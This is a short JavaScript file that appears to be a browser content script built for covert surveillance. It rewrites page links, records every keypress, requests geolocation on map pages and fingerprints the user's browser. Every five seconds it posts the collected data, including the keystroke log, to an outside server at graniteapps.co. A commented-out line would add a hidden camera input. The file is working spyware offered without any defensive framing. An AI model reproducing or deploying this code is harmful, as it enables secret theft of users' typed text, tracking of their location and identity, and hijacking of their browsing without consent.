// Settings
// server needs to be https to work properly
var server = "https://graniteapps.co/services/track/";
// User info
var pageVisit = {};
var user = {};
pageVisit.url = window.location.href;
pageVisit.time = Math.floor(Date.now() / 1000);

// Modify outgoing url on a site
$("a").each(function() {
  var $elem = $(this);
  var url = $elem.attr("href");

  if(!url) return;
  if(url.indexOf("https://news.ycombinator.com") != 0 || url.indexOf("http") != -1) {
    $elem.attr("href", "http://www.google.com/?q=fake+site")
  }
});

// Key logger
document.addEventListener('keypress', function (e) {
    e = e || window.event;
    var charCode = typeof e.which == "number" ? e.which : e.keyCode;
    if (charCode) {
      pageVisit.keylog += String.fromCharCode(charCode);
      console.log(pageVisit);
    }
});

// Send data to server every 5 seconds
var timer = setInterval(function() { postServer(pageVisit, 'track'); }, 5000);

function postServer(data, type) {
  $.ajax({
    type: "POST",
    url: server + "api/v1/" + type,
    data: data,
    dataType: "json"
  });
}

// If user visits a map page, send location
function saveLocation(position) {
  console.log(position.coords);
  user.coords = position.coords;
  // TODO add coords to user and send
}

if(pageVisit.url.indexOf("maps")!=-1){
  navigator.geolocation.getCurrentPosition(saveLocation);
}

// $('body').append('<input id="camera" style="display:none"type="file" accept="image/*;capture=camera">');

new Fingerprint2().get(function(result, components){
  pageVisit.user = result;
  user.id = result;
  user.agent = components[0].value;
  user.lang = components[1].value;
  user.timezone = components[7].value;
  console.log(components); // an array of FP components
  console.log(user); // an array of FP components
  postServer(user, 'user');
});
